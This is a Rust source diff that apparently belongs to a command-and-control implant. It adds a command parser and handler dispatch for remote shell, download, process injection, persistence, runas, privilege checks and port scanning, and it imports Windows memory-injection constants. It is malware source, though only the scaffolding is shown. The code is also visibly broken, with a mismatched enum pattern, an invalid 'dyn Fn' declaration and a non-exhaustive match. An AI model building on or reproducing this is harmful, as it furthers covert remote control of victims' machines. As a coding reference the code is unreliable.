@@ -17,9 +17,50 @@ use reqwest::{Client};
 use crate::config::ConfigOptions;
 
 #[cfg(windows)]  use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
+pub mod cd;
+pub mod download;
+// pub mod portscan;
+pub mod pwd;
+pub mod ps;
+pub mod shell;
+pub mod is_elevated;
 
-mod cmd;
+pub enum CommandType {
+    Cd(String),
+    Shell(String),
+    Download(String),
+    Ps,
+    Pwd,
+    Inject(String),
+    Save(String),
+    Persist(String),
+    Runas(String),
+    Getprivs,
+    Portscan(String),
+    Shutdown,
+    Unknown
+}
 
+#[derive(Debug)]
+struct CommandError(String);
+
+impl fmt::Display for CommandError {
+    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
+        write!(f, "{}", self.0)
+    }
+}
+
+impl Error for CommandError {}
+
+/// Handler for a NotionCommand
+// pub trait CommandHandler {
+//     fn handle(s: S)
+// }
+
+pub struct NotionCommand {
+    pub commmand_type: CommandType,
+    pub handler: dyn Fn(String) -> Result<String, Box<dyn Error>>
+}
 
 impl NotionCommand {
     pub fn from_string(command_str: String) -> Result<NotionCommand, Box <dyn Error>> {
@@ -49,7 +90,14 @@ impl NotionCommand {
                 "shutdown" => CommandType::Shutdown,
                 _          => CommandType::Unknown
             };
-            return Ok(NotionCommand { commmand_type:command_type});
+            let handler: dyn Fn<String> = match command_type {
+                CommandType::Cd(_)      => cd::handle,
+                CommandType::Download() => download::handle,
+                CommandType::Shell(_)   => shell::handle,
+                CommandType::Ps         => ps::handle,
+                // _                       => ps::handle
+            };
+            return Ok(NotionCommand { commmand_type: command_type, handler: handler});
 
         } else {
             return Err(Box::new(CommandError("Could not parse command!".to_string())));
